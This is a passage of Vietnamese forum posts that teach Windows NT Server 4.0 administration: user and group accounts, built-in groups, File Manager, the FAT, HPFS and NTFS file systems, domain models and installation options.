			<span class="postbody">THIẾT ĐẶT KHOẢN MỤC NGƯỜI SỬ DỤNG.<br/><br/> GiớI thiệu về quản trị winnt.<br/><br/> Trong một mạng winnt bạn có thể là nhà quản trị toàn mạng nhưng cũng có thể là ngườI sử dụng .Bài này cho các bạn cái nhìn tổng quan về những nhiệm vụ và công cụ giúp anh ta trong công tác quản trị đó .<br/><br/> I. Những nhiệm vụ quản trị .<br/> quản trị Windows NT server bao gồm những công việc phảI tiến hành sau khi cài đặt mạng và công việc bảo trì hằng ngày .Nhiệm vụ có thể gộp vào 5 nhóm sau đây.<br/><br/> 1.Quản trị khoản mục ngườI sử dụng và khoản mục nhóm.<br/> Hoạch định khởI tạo và duy trì các khoản mục ngườI sử dụng và khoản mục nhóm để đảm bảo ngườI sử dụng có thể đăng nhập cũng như truy cập vào các tài nguyên cần thiết cho công việc của họ.<br/><br/> 2.Quản trị bảo mật<br/> Hoạch định triển khai và áp dụng chính sách bảop mật nhằm bảo vệ tài liệu cũng như các tài nguyên chung trên mạng .<br/><br/> 3.Quản trị máy in<br/> Cài đặt máy in cục bộ hay máy in mạng để đảm bảo cho ngườI sử dụng có thể dể dàng nhanh chóng truy nhập vào và in.<br/><br/> 4.Quan sát và điều phốI các tài nguyên ,các sự kiện trên mạng<br/> Hoạch định triển khai chính sáh theo dõi kiểm soát các sự kiện xảy ra trên mạng liên quan đế vấn đề bảo mật theo dõi và điều khiển vấn đề sử dụng tài nguyên.<br/><br/> 5.Sao lưu và phục hồI dữ liệu .<br/> Hoạch định ,lập lịch và thực hiện việc sao lưu đảm bảo việc phục hồI nhanh chóng dữ liệu nếu xảy ra sự cố .<br/><br/> II.Những công cụ và chức năng quản trị Windows NT server .<br/> Administrator wizard (thuật sĩ quản trị):<br/> là cộng cụ hướng dẫn cho bạn việc thực hiện một loạt công việc quản trị như tạo ra các khoản mục ngườI sủ dụng ,tạo ra và sửa đổI các khoản mục nhóm ………<br/><br/> User manager for domain<img src="/hvaonline/images/smilies/274a01ad7ad7ad7d73d5f0b399ae5db2.gif" border="0" alt="smilie" align="absbottom">quản lí ngườI sử dụng của vùng)<br/> Đây là công cụ cho phép bạn tạo ,xoá ,vô hiệu hoá các khoản mục NSD củ vùng bạn có sthể đặt ra các chính sách hệ thống hay dưa các khoản mục vào nhóm .<br/><br/> Server manager(quản lý máy chủ)<br/> Đậy là công cuj cho phép bạn xem quản lý các máy tính của vùng .<br/><br/> Event viewer(Xem các sự kiên)<br/> Là sự kiện xuất hiện một hành vi trạng thái của hên thống hay một chương trình mà bạn quan tâm công cụ này sẽ nhắc bạn bằng thông báo trên màng hình hay ghi vào nhật ký sự kiện<br/><br/> Windows NT diagnostics(chuẩn đoán winnt)<br/> Hiển thị hoặc in ra cấu hình hệ thống .<br/><br/> Backup(Sao lưu)<br/> Đây là cộng cụ dùng để sao lưu thông tin vào băng từ nhằm bảo vệ dữ liệu trong trường hợp xảy ra sự cố.<br/><br/> III.Quản lý ngườI dùng v à nh óm trong winnt<br/> I. Account người dùng và nhóm trong Windows NT<br/> Một account người dùng bao gồm thông tin về một người dùng như:<br/> - Tên người dùng<br/> - Tên đầy đủ<br/> - Mật khẩu<br/> - Quyền trên hệ thống<br/> Để có thể nhập hệ thống Windows NT phải cần ít nhất một account. Một account gán cho một người dùng nhất định một tập các quyền, định nghĩa cách thức họ có thể sử dụng hệ thống.<br/> Một nhóm là một tên, tương tự với tên người dùng hoặc account người dùng, có thể được sử dụng để tham chiếu tới nhiều người dùng. Mục đích là để làm thuận tiện việc cung cấp và kiểm soát truy cập tới nhiều người dùng cùng có một nhiệm vụ tương tự. Bằng cách đặt các người dùng vào một nhóm, bạn có thể dễ dàng cung cấp cho các người dùng trong nhóm đó cùng khả năng hoặc hạn chế nhất định. Nếu bạn cần thay đổi quyền gán cho các người dùng trong nhóm, bạn chỉ việc sửa đổi một account - group account.<br/><br/> II. Nhóm cục bộ (local groups)<br/> Đối với Windows NT, chỉ một kiểu nhóm có thể được tạo và bảo trì - nhóm cục bộ. Một nhóm cục bộ chỉ có thể được cung cấp quyền trong hệ thống của nó. Tuy nhiên, nếu hệ thống lại là một phần của một domain thì nhóm cục bộ có thể chứa account của người dùng từ domain hoặc các domain được tin cậy bất kỳ.<br/> Không thể gán quyền truy nhập tài nguyên trên \\workstation_1 cho một nhóm cục bộ định nghĩa trên \\server_2.<br/> Trong một domain, khi một nhóm cục bộ định nghĩa trong PDC nó được chép tự động sang các BDC khi dữ liệu các accounts được nhân bản. Nó được xác định trong dữ liệu tất cả các domain controllers (bao gồm PDC, các BDCs) trong domain đó. Nhóm cục bộ được gán quyền tới các tài nguyên của bất cứ domain contronllers nào trong domain.<br/> Trong một môi trường workgroup, một thành viên trong nhóm cục bộ chỉ có thể gồm một account người dùng từ dữ liệu account trong máy tính đó.<br/> Một nhóm cục bộ trong Windows NT Workstation và Windows NT Server gồm :<br/> - Các account người dùng của máy tính cục bộ<br/> - Các người dùng và các nhóm tổng thể (global group) của domain máy tính cục bộ<br/> - Các người dùng và các nhóm tổng thể từ các domains được thừa quyền (hay còn gọi là "tin cậy"-trusted) bởi domain cục bộ<br/> Chú ý: Để dễ quản lý chúng ta sử dụng nhiều tới nhóm cục bộ<br/> Các nhóm cục bộ bổ trợ thiết lập trước<br/> Có một vài nhóm bổ trợ có sẵn trong các domain controllers Windows NT Server:<br/> - Server Operators: Đảm trách cho mạng các domain controllers hoạt động. Các thành viên nhóm này có cùng quyền hạn như Administrator, ngoại trừ nó không thể quản lý bảo mật trong server. Nó chỉ có thể cho phép dùng chung hay bỏ dùng chung các tài nguyên của domain controllers, khoá hay mở khoá một domain controller, và tạo khuôn dạng (format) các đĩa của domain controllers. Nó cũng có quyền tại các domain controllers như sao lưu (back up) và lưu trữ tệp, shut down (tắt) một domain controller.<br/> - Account Operators: Có thể quản lý các account nhóm hay người dùng của domain. Nó có thể tạo, xoá, sửa hầu hết các người dùng, nhóm tổng thể, và nhóm cục bộ. Nó không thể sửa các account người dùng dạng Administrator, hoặc các nhóm cục bộ như nhóm Administrators, Server Operators, Account Operators, Print Operstors, Backup Operators. Và nó cũng không thể gán quyền người dùng.<br/> - Print Operators: Có thể chia xẻ hay ngừng chia xẻ các máy in, quản lý các máy tin trong domain controllers. Nó có thể truy nhập vào các domain controllers và tắt chúng.<br/><br/> Quản trị file<br/><br/> I. Thay đổi trong File Manager<br/><br/> Thay đổi quan trọng nhất trong Windows NT File Manager là File Manager bây giờ là ứng dụng 32 bit và File Manager hiện đã hỗ trợ hệ thống file cài đặt được, chẳng hạn như NTFS.<br/><br/> 1. Đa luồng<br/> Windows NT File Manager đã được cải tiến và một số chức năng hiện nay là đa luồng. Chẳng hạn tìm kiếm file và lên khuôn dạng đĩa mềm hiện có thể được thực hiện dưới ngầm trong khi thực hiện các công việc khác trong File Manager.<br/><br/> 2. Menu File<br/> Dưới Properties, hiện đã có nút Open By. Nút này chỉ xuất hiện dưới File Properties khi file đã được chọn trước khi File Properties được chọn. Nó sẽ mở một hộp đối thoại gồm total opens, total locks, ai có file mở, và đặt tuỳ chọn.<br/><br/> 3. File Associate<br/> File Associate hiện bao gồm cả các chức năng được cung cấp cho Windows 3.1, bởi chương trình REGEDIT trong Windows 3.1. Các thiết lập của nó được lưu trong Windows NT Registry dưới HKEY_CLASSES_ROOT.<br/><br/> 4. Menu Disk<br/> - Không còn tuỳ chọn để tạo một system disk nữa.<br/> - Connect và Disconnect là các mục riêng biệt trên menu.<br/> - Share As - cho phép chia sẻ các thư mục.<br/> - Stop Sharing - ngừng chia sẻ thư mục.<br/><br/> 5. Menu Options<br/> - Cá thể hoá thanh công cụ<br/> - Thanh công cụ có thể được cho phép hoặc không cho phép<br/> - Drivebar có thể được cho phép hoặc không cho phép<br/> - Open New Windows on Connect - khi nối với ổ mạng, tuỳ chọn này tạo một cửa sổ để hiển thị nội dung của ổ.<br/><br/> 6. Menu Window<br/> Tile Horizontally - sắp xếp các cửa sổ ổ đĩa đang mở theo chiều ngang<br/> Tile Vertically - sắp xếp các cửa sổ ổ đĩa theo chiều dọc<br/><br/> 7. Menu Security<br/> - Permissions - cho phép thiết lập quyền trên thư mục và file<br/> - Auditing - cho phép kiểm soát được thiết lập trên thư mục và file<br/> - Owner - cho phép quyền chủ sở hữu được lấy ra từ thư mục và file<br/><br/> 8. The new Toolbar<br/> Thanh công cụ của Windows NT File Manager rất giống Windows for Workgroup File Manager. Thanh công cụ này có thể cấu hình hoá được, tuy nhiên sẽ không bao bọc đối với những nút không đặt vừa màn hình. Vì vậy nếu có quá nhiều mục trong thanh công cụ thì chúng sẽ bị nằm ngoài màn hình. Có thể sẽ có vấn đề nếu người dùng chuyển từ driver màn hình phân giải cao (1024x768) sang độ phân giải thấp hơn (640x480) bởi vì họ sẽ không thể cho tất cả các mục vào trong màn hình.<br/> Khác biệt chính giữa thanh công cụ mặc định trong Windows NT và Windows for Workgroups là trong Windows NT có nút an toàn.<br/><br/> II. Hỗ trợ hệ thống file<br/><br/> Windows NT hỗ trợ nhiều hệ thống file tích cực có thể được nạp về như bất kỳ driver nào. Điều này khiến Windows NT có khả năng hỗ trợ bất cứ hệ thống file nào chừng nào một driver được phát triển cho nó. Theo mặc định Windows NT hỗ trợ những hệ thống file sau:<br/> - Hệ thống tệp MS-DOS FAT<br/> - Hệ thống tệp OS/2 HPFS<br/> Hệ thống tệp Windows NT NTFS mới<br/> - Hệ thống tệp CD<br/> - Hệ thống tệp Named Pipe<br/> - Hệ thống tệp Mailslot<br/> Để phục vụ mục đích thảo luận, chúng ta sẽ chỉ tập trung trên ba hệ thống tệp được sử dụng trong các ổ đĩa cứng đọc/ghi: FAT, HPFS và NTFS.<br/><br/> 1. Chọn hệ thống tệp<br/> NTFS là hệ thống tệp thông thường, tuy nhiên trong một số trường hợp cũng có thể cần sử dụng các hệ thống tệp khác. Chẳng hạn, nếu hệ thống chạy một hệ điều hành khác thì ít nhất một phân vùng-partition phải được lên khuôn dạng theo cách của hệ điều hành đó. Trong trường hợp MS-DOS, thì partition thứ nhất phải được lên khuôn dạng bằng hệ thống tệp FAT. Hệ thống tệp FAT có một lợi điểm là nó được sử dụng rộng rãi và được nhiều hỗ trợ của các hệ điều hành khác.<br/> Để xác định chính xác sử dụng hệ thống file nào, cần thiết phải có một số hiểu biết về mỗi hệ thống file đang được hỗ trợ.<br/> Btrees (Bcây) là cấu trúc cây nhị phân với một gốc và một số các nốt. Dữ liệu dược tổ chức theo kiểu logic sao cho dễ duyệt. Gốc chứa một ánh xạ tới phần còn lại của cấu trúc và các nốt chứa dữ liệu.<br/><br/> 2. Hỗ trợ POSIX<br/> NTFS tuân thủ nhất POSIX.1 của các hệ thống file được hỗ trợ vì nó hỗ trợ các yêu cầu sau của POSIX.1:<br/> - Đặt tên phân biệt chữ hoa chữ thường. Trong POSIX, README.TXT, Readme.txt, và readme.txt là các file khác nhau<br/> - Tem thời gian bổ sung. Tem thời gian bổ sung cung cấp thời gian khi file được truy nhập lần cuối cùng.<br/> - Liên kết cứng. Một liên kết cứng là khi hai tên file khác nhau, có thể nằm ở các thư mục khác nhau trỏ tới cùng một dữ liệu.<br/><br/> 3. Loại bỏ các hạn chế<br/> Trước hết là NTFS đã tăng đáng kể kích thước của các file và các volume sao cho chúng có thể lớn tới 264. NTFS cũng quay về khái niệm cluster của FAT để tránh vấn đề của HPFS đối với kích thước sector cố định. Điều này được thực hiện bởi vì Windows NT là một hệ điều hành khả chuyển và hỗ trợ các công nghệ đĩa khác nhau. Do vậy, 512 byte một sector dường như được coi là chưa chắc đã phải luôn luôn khớp với các định vị. Điều đó được thực hiện bởi cho phép cluster được định nghĩa như tích của kích thước định vị tự nhiên của phần cứng. Cuối cùng, trong NTFS tất cả các tên file là Unicode và tên kiểu 8.3 được giữ cùng với tên dài.<br/><br/> 4. Ưu điểm của NTFS<br/> NTFS là giải pháp tốt nhất khi sử dụng các volume kích thước 400 MB hoặc hơn. Lý do là vì hiệu năng hệ thống không giảm đi trong NTFS như là trong FAT khi kích thước volume tăng lên.<br/> Tính có thể phục hồi được thiết kế trong NTFS sao cho người dùng không bao giờ phải chạy bất kỳ một kiểu tiện ích sửa đĩa nào trong một partition NTFS.<br/><br/> 5. Nhược điểm của NTFS<br/> Nói chung không NTFS không được khuyến cáo sử dụng đối với các volume có kích thước nhỏ hơn 400 MB vì không gian lưu chuyển trong NTFS thường lớn. Không gian lưu chuyển này dưới dạng của các file hệ thống NTFS thông thường sử dụng ít nhất 4 MB ổ đĩa trong một partition có kích thước 100 MB.<br/> Đồng thời, không có mã hoá file trong NTFS. Do đó, ai đó có thể khởi động dưới MS-DOS, hoặc hệ điều hành khác và sử dụng các tiện ích soạn thảo đĩa mức thấp để nhìn dữ liệu được lưu trong volume của NTFS.<br/> Không thể lên khuôn dạng cho một đĩa mềm trong hệ thống file NTFS, Windows NT lên khuôn dạng tất cả các đĩa mềm với hệ thống file FAT. Lý do là bởi vì thông tin lưu chuyển trong NTFS sẽ không đặt vừa trong một đĩa mềm.<br/><br/> 6. Quy ước đặt tên của NTFS<br/> - Tên file và thư mục có thể dài đến 255 ký tự, và có thể gồm bất cứ mở rộng nào.<br/> - Các tên vẫn duy trì chữ hoa chữ thường, nhưng không phân biệt chữ hoa chữ thường. NTFS không phân biệt tên file dựa trên chữ hoa chữ thường.<br/> - Tên có thể chứa bất kỳ ký tự nào ngoài các ký tự: ? " / \ &lt; &gt; * | :<br/> Chú ý Hiện nay, từ dòng lệnh chỉ có tên file dài 253 ký tự có thể được tạo.<br/><br/> 7. Các tên file phân biệt chữ hoa chữ thường được quản lý như thế nào<br/> Như đã nói ở trên một trong những yêu cầu của POSIX được NTFS hỗ trợ là cách đặt tên phân biệt chữ hoa chữ thường. NTFS, một phân hệ POSIX và các ứng dụng POSIX không có vấn đề gì trong việc sử dụng tên file phân biệt chữ hoa chữ thường. Tuy nhiên, WOW, VDM, OS/2 và Win32 hiện không hỗ trợ các đặt tên phân biệt chữ hoa chữ thường. Do đó, bất kỳ ứng dụng nào chạy trong bất kỳ môi trường nào trong số này có thể nhầm lẫn vì các file sử dụng các tên phân biệt chữ hoa chữ thường.<br/> Giả sử có một thư mục trên một voulme NTFS, trong đó có ba file chẳng hạn như: readme.txt, Readme.txt và README.TXT - CMD.EXE và File Manager sẽ hiển thị cả ba file. Tuy nhiên khi thao tác các file này thông qua dấu nhắc dòng lệnh Windows NT hoặc File Manager các file sẽ đụng độ với nhau. Giả dụ copy những file này về thư mục gốc, nó sẽ copy toàn bộ cả ba file, nhưng chúng sẽ copy lên trên mỗi file khác và sẽ có một file readme.txt trong thư mục gốc với nội dung của file thứ ba được copy.<br/> Windows NT Notepad nhìn thấy cả ba file và hiển thị chúng theo đúng chữ hoa chữ thường trong hộp đối thoại mở file. Tuy nhiên, dù file nào được mở, Notepad sẽ luôn luôn mở và ghi vào readme.txt và hiển thị README.TXT trong thanh tên. EDIT.COM của MS-DOS 5.0 cũng hoạt động như Notepad.<br/> Windows NT có cả hai tuỳ chọn tên phân biệt và không phân biệt chữ hoa chữ thường. Mặc dù NTFS hỗ trợ tên phân biệt chữ hoa chữ thường, hiện nay chỉ có phân hệ POSIX là sử dụng tên phân biệc chữ hoa chữ thường.<br/><br/> 8. Cách quản lý sự khác nhau trong cách đặt tên file<br/> Cả HPFS và NTFS đều tương thích với FAT, tức là đều chấp nhận và sử dụng các tên file chuẩn FAT 8.3, nhưng chúng cũng đều hỗ trợ tên file dài. Tuy nhiên, chỉ có NTFS giữ tên file 8.3 cùng với tên file dài (được tự động). Tên file 8.3 của NTFS có thể được thể hiện trong File Manager (chi tiết-File Details) hay bằng dòng lệnh ”DIR/X"<br/> Chú ý: Vì HPFS chỉ có tên file dài và FAT chỉ chứa tên file 8.3, nên lệnh DIR /X sẽ có cột trắng ở cột thứ 2 của tên file nếu phân vùng của nó là HPFShay FAT.<br/> NTFS cho phép các ứng dụng MS-DOS và Windows 3.x nhận biết hay nạp các file thậm trí cả tên file dài NTFS. Thêm nữa ứng dụng MS-DOS/Windows 3.x cất file trên volume NTFS, cả tên file 8.3 và NTFS được chấp nhận.<br/> Chú ý: Khi cất file từ ứng dụng MS-DOS/ Windows 3.x trên volume NTFS, nếu ứng dụng lưu nó ra file tạm, xoá file ban đầu, đổi tên file tạm thành file ban đầu, TÊN FILE DÀI ĐƯỢC PHÉP! Hơn nữa các quyền trên file này cũng được đảm bảo trên file mới.<br/> Khi sử dụng tên file dài cho các biểu tượng trong Program Manager, nếu có dấu trắng trong đường dẫn thì phải đặt đường dẫn trong dấu nháy kép "". Ví dụ Word for Windows trong thư mục D:\Word for Windows, thì dòng Command Line là: "D:\Word for Windows\winword.exe".<br/> COPY, XCOPY, và tên file dài<br/> Ngầm định COPY XCOPY sao chép file với tên dài của nó khi sao tên file dài từ NTFS hay HPFS sang FAT sẽ có lỗi:<br/><br/> The filename, directory name, or volume label syntax is incorrect.<br/> và lệnh này sai khi gặp phải tên file dài.<br/><br/> Có thể dùng COPY/XCOPY, từ phân vùng NTFS sang FAT với thông số mới /n. Thông số này cho COPY/XCOPY sử dụng tên file 8.3 NTFS sinh ra.<br/><br/> Tên file NTFS 8.3 được sinh ra thế nào ?<br/> NTFS sinh ra tên file NTFS 8.3 theo cách:<br/> - Bỏ các ký tự trắng.<br/> - Các dấu chấm được loại trừ dấu chấm cuối ở tên file mà nó có một ký tự tiếp theo. NTFS hiểu dấu chấm cuối và ba ký tự tiếp theo là phần mở rộng của tên file.<br/> - Thay tất cả các ký tự trong DOS không hợp cách bởi dấu gạch dưới (_).<br/> - Gộp tên file tới 6 ký tự (không có phần mở rộng), với ký tự (~), và số tuần tự để phân biệt duy nhất. Các số đơn được thử đầu tiên. Nếu xung đột thì số có hai chữ số được thử. Trong quá trình so sánh tên file, nó cũng xác định được phần mở rộng tên file.<br/> - Nối phần mở rộng với 3 ký tự.<br/> File System Drivers và Registry Entries<br/> Mỗi file trong 3 hệ thống file đều được tạo từ các phần sau:<br/> - Trình điều khiển hệ thông file (File System Driver)<br/> - Đó chính là một phần của hệ thống file là trình điều khiển hệ thống file trong hệ thống . Các trình điều khiển hệ thống file có thể được cấu hình trong Control Panel ở phần Devices, ngầm định giá trị khởi động (startup) là Disabled. Vùng cho File System Drivers có thể thấy trong:<br/><br/> \HKEY_LOCAL_MACHINE<br/> \SYSTEM<br/> \CurrentControlSet<br/> \Services<br/> \&lt;driver name minus the extension&gt;<br/><br/> - Trình xác nhận hệ thống file (File System Recognizer) Là một phần trong hệ thống file để nhận biết xemmột hệ thống file có cần thiết phải được nạp trên hệ thống hay không. Khi một ổ đầu tiên được truy nhập, nếu trình xác nhận hệ thống file đang chạy, trình xác nhận sẽ khởi động hệ thống file tương ứng và sau đó nó tự kết thúc (chết). Tương tự nó cũng có thể được cấu hình trong Control Panel Devices và có giá trị ngầm định khởi động là System. Vùng cho File System Recognizers có thể thấy trong:<br/><br/> \HKEY_LOCAL_MACHINE<br/> \SYSTEM<br/> \CurrentControlSet<br/> \Services<br/> \&lt;recognizer name minus the extension&gt;<br/><br/> - Thư viện liên kết động tiện ích hệ thống file(File System Utility Dynamic Link Library-DLL) Là một phần của hệ thống file chứa các thực thể (entry) đặc tả hệ thống file cho các tiện ích như CHKDSK và FORMAT. Để cho hệ thống file được cài đặt mới làm việc với những tiện ích này thì tiện ích hệ thống file DLL cần được cung cấp.<br/> Loại phân vùng FAT HPFS NTFS<br/> File System Driver FASTFAT.SYS PINBALL.SYS NTFS.SYS<br/> File System FAT_REC.SYS HPFS_REC.SYS NTFS_REC.SYS<br/> Recognizer<br/> File System UFAT.DLL UHPFS.DLL UNTFS.DLL<br/> Utility DLL<br/><br/> Tất cả các file hệ thống file có thể tìm trong thư mục con \&lt;winnt root&gt;\System32.<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/130.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/130/482.html#482,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Tổng quan về Windows NT server 4.0<br/><br/> Sử dụng Windows NT server có những lợI thế như sau .<br/> Windows NT server hổ trợ 4 bộ vi sử lý trong môi trường đa sử lý song song .<br/><br/> Truyền thông được tạo sẵn .<br/> Windows NT server hỗ trợ truy cập từ xa (Remote Access Service -RAS)qua đường điện thoạI quay số và hỗ trợ tốI đa 256 đường quay vào .<br/><br/> Các công cụ quản trị .<br/> Các công cụ quản trị Task manager (quản trị tác vụ )và Network Monitor (theo dõi mạng)làm giảm nhẹ cong việt hằng ngay của nhà quản trị .<br/> Task manager theo dõi các chương trình,các tác vụ,và các số đo hiệu suất cơ bản để cung cấp cho bạn nhưng thông tin cũng như tiến trình chạy của hệ thống .<br/> Network Monitor thi kiểm tra các dòng thông tin trên mạng đến tận các gói tin và cho phép lưu lạI cho việt phân tích sau này .<br/><br/> Internet Information Server(IIS)<br/> Đây là phần mềm phụ vụ quản trị các trang web mà sự tương thích của nó vào Windows NT server làm cho việt quản lý một phần mềm web phụ vụ đơn giản là một hệ điều hành .Ngoài ra vớI phiên bản IIS 2.0 bạn có thể quản trị từ xa các điểm web từ bất kỳ máy tính chặy windows có trình duyệt web nào . IIS cung cấp một nền tảng an toàn ,nhanh và mạnh cho các phục vụ HTTP,FPT<br/><br/> Cơ chế chống lỗI :<br/> Windows NT server hỗ trợ công nghệ RAID về bảo vệ dữ liệu ơ mức đô khác nhau.<br/><br/> Các dịch vụ mạng bổ xung:<br/> Gồm dịch vụ dịnh tuyến đa giao thức MPR(Multiprotocol routing) hệ thống tên vùng DNS (Domain Name system)giao thức cấu hình dịa chỉ động DHCP và dịch vụ trên internet của windows WINS<br/><br/> Dịch vụ thư mục của winNT CSDL thư mục cung cấp khả năng đăng nhập duy nhất quản trị tập trung và khả năng truy nhâp tài nguyên qua mạng .<br/><br/> CÁC MÔ HÌNH NHÓM CÔNG TÁC VÀ VÙNG<br/> 1.Mô hình nhóm công tác.<br/> Mô hình tiêu biêu nhất là mạng ngang hàng (peer to peer) trong mạng ngang hàng mọI may tính tình viên của mạng có quyền ngang nhau trong việc chia sẽ file, thư mục hay máy in .Thông thương không ai được trao quyền quản tri cho toàn mạng.MỗI ngườI sự dụng trên máy sẽ quyết định xem sẽ chia sẻ dữ liệu gì và cho ai.<br/> Trong mô hình này các tài nguyên cũng như việc quản trị được phân phốI rảI rác khắp trên mạng mỗI máy trên mạng đều có thể dùng như một máy phục vụ hay máy sử dụng. Đây là mạng tương đốI đơn giản và có nhưng ưu điểm sau :<br/> Dể dàng chia sẻ tài• nguyên<br/> Tài nguyên dể phân tán•<br/> Đòi hỏI bảo trì ở mức độ thấp đốI vớI• ngườI quản trị<br/> Dễ dàng thiết kế và thực hiên•<br/> Thuân tiện cho môt số• lượng có giói hạn các máy sử dung ở gần nhau<br/> Tuy nhiên mạng này chỉ sử dung cho một lươngj máy nhỏ dướI 10 máy<br/> Mạng này có nhưng khuyết điểm là.<br/> • Không quản trị tài khoản tập trung<br/> Không có quản trị tập trung việc truy• cập tài nguyên<br/> Ko quản trị tập trung cấu hình và đảm bảo an toàn cho các• máy sử dụng<br/> hiệu năng thấp đốI vớI mạng nhiều máy•<br/> Các khoản mục• ngườI sủ dung(NSD) phảI tạo cho từng máy<br/> 2.Mô hình vùng<br/> Là mô hình dạng có trên có dướI,các may tính thành viên của mạng khong có quyền ngang nhau.Trong vùng thường có một máy phục vụ (server) được tốI ưu hoá để cung cấp nhanh chóng các dịch vụ cho máy sử dụng<br/> Một vùng Windows NT server tiêu biểu bao gồm các loạI máy phục vụ vớI các chức năng sau:<br/> Các máy phục vụ về• thư mục:Những máy phục vụ này cho phép NSD đăng nhập vùng , định vị lưu trữ và bảo mật thông tin trên mạng.<br/> Các máy phục vụ về file in ấn:những máy phục• vụ này quản lý việc truy nhập tài nguyên file và in ấn.DV khi chạy word bạn chạy ứng dụng trên máy bạn nhưng lạI tảI tài liệu file văn bản từ máy phục vụ và in ấn về.<br/> Các máy phục vụ cho ứng dụng:Các máy phục vụ này giữ vai trò phục vụ• trong các ứng dụng sử dụng ohục vụ của bạn .Noi Switch ngắn gọn khi chạy những ứng dụng loạI này máy sử dụng của bạn chỉ thực hiện những thao táctính toán đơn giản chủ yếu là nơi nhận các kết quả từ máy phục vụ gửI về .<br/> Các máy phục• vụ về truyền thông: Đây là máy phục vụ thực hiện việc truyền dữ liệu thư điện tử trong nộI bộ vớI các mạng khác vói các máy tính lớn hoặc cho phép NSD truy nhập vào theo đường điện thoạI<br/> Mô hình vùng của mạng tạo khả năng quản trị cũng như bảo mật một cách tập trung cho phép chíảe dữ liệu thư mục và có thể quản lý như một nhóm<br/><br/> 3.Vai trò của máy phục vụ trong vùng.<br/> Trong một vùng tiêu biểu tồn tạI ba đạng máy phục vụ sau:<br/> +Điều khiển vùng chính (Primary Domain controller-PDC)<br/> +Điều khiển dự phòng(Backup Domain controller-BDC)<br/> +Máy phục vu(server)<br/> DướI đay là mô tả chức năng từng loạI:<br/> a. Điều khiển vùng chính (Primary Domain controller-PDC)<br/> Đây là máy phục vụ đầu tiên được Windows NT server xác định trong quá trình cài đặt .Dùng để duy truỳ các khoản mục,xác nhận sự đăng nhậpvùng.Nó quản lý bản chính của CSDL thư mục chứa bản mục và chiến lược bảo mật cho toàn vùng<br/><br/> b. Điều khiển dự phòng(Backup Domain controller-BDC)<br/> Những máy này có nhiệm vụ đăng nhập vùng cùng vớI máy điều khiển vùng chính và thay thế máy điều khiển vùng chính trong trường hợp xảy ra sự cố.MỗI máy dự phòng quản trị CSDL bản sao của thư mục và mọI thông tin của của PDC.<br/><br/> c. Máy phục vu(server)<br/> Những máy phục vụ khác nhau của vùng có trách nhiệm cụ thể nhưcung cấp các dịch vụ về file in ấn ,dịch vụ về các ứng dụng cụ thể khác…..ko quản lý CSDL như thư mục và ko được cập nhật thông tin về các khoản mục.<br/> Ko như các máy điều khiển vùng các máy phục vụ khác ko tham gia việc xác nhập đăng nhập hay nhân bản CSDL thu mục.Các máy phục vụ ko thể được thăng cấp thành máy điều khiển vùng mà ko cài lạI windows NT.<br/> BÀI SAU:Cài đăt Winnt<br/><br/> Cài đặt WinNT server<br/> Trước khi tiến hành cài đặt ,ta phảI xem xét thông tin cần thiết ,xác định phương phátp cài đặt như cài qua đĩa ,qua mạng , cài nhanh (express),theo ý(custom)và đặt tên vùng.<br/><br/> Chọn hệ thống file<br/><br/> Trước khi cài đặt bạn phảI biết mình cần hệ thống file nào . Windows nt server cho phép bạn chọn những hệ thống file như sau.<br/> + Hệ thống file của NT (NT file system NTFS)<br/> +Bản định vị file((File allocation Table FAT)<br/> FAT cho phép truy nhập từ các hệ điều hành Windows NT , Win95, MS dos …Dùng FAT nếu cần các ứng dụng của MS DOS ,hoặc đĩa đã được định dạng FAT để khởI động được cả Window NT và hệ điều hành khác phân hoạch hệ thống cần được định dạnh bởI FAT<br/><br/> NTFS chỉ được win NT , win2000……Do vật các hệ điều hành khác dùng FAT không truy cập được .Tuy nhiên nếu chọ NTFS thì bạn sẽ có những lợI thế về bảo mật ở mức độ file.<br/><br/> Các thông tin cần thiết để cài đặt.<br/><br/> Trong quá trình cài đặt bạn phảI cung cấp những thông tin sau:<br/> + về cấu hình mạng:Tên duy nhất cho máy tính ,tên của vùng hay nhóm công tác .vai trò của máy phục vụ,xác định giao thức truyền số liệu.<br/> +Về phần cứng :Kiểu card mạng,cấu hình card mạng như IRQ hoặc địa chỉ I/Ơnhững thông số đặc biệt cho card mạng.<br/> +Các máy in nốI vớI máy Windows NT server :kiểu máy in,cổng cho máy in.<br/><br/> Lựa chọn những khai báo cho quá trình cài đặt:<br/><br/> + cài đặt nhanh<img src="/hvaonline/images/smilies/274a01ad7ad7ad7d73d5f0b399ae5db2.gif" border="0" alt="smilie" align="absbottom"> Express)<br/><br/> Đây là cách cài đặt nhanh nhất ,dùng cho việc cài đặt chuẩn,cài đăt nhanh sẽ hỏI bạn ít nhất và cài đặt mọI thành phần chuẩn trên Windows NT<br/><br/> Cài đặt theo ý: (custom)<br/><br/> Cho phép bạn điều khiển các thông số qua màng hình cài đặt ,có thể chỉ ra các giao thức ,loạI card mạng mà quá trình cài đặt không nhân ra ,có thể bỏ các thành phần như trò chơi…<br/> Liên quan đến vùng trong quá trình cài đặt bạn cần cung cấp các thông tin sau :<br/> + Chọn vùng:<br/> chương trình sẽ hiện lên hộp hộI thoạI để bạn có thể cài một máy tính thành PDC hay BDC hay máy phục vụ cho vùng ,tham giao một nhóm công tác hay vùng.<br/> +Tham gia một vùng:<br/> Nếu Windows NT server là BDC hay máy phục vụ trong một vùng bạn cần cung cấp tên của vùng trong qúa trình cài đặt,ngườI quả lý vùng sẽ làm việc sau<br/> - cho phép máy cuả bạn có một khoản mục vào vùng trước khi cài đặt.<br/> -Cho phép bạn tạo khoản mục trong máy tính trong quá trình cài đặt,Nếu cài đặt PDC bạn sẽ chọ một tên vùng mớI<br/> +Đặt tên vùng :<br/> Nếu đặt máy thành PDC cho một vùng mớI cần phảI chọn tên vùng hkông trùng vớI những tên đã tồn tạI những tên chung trên 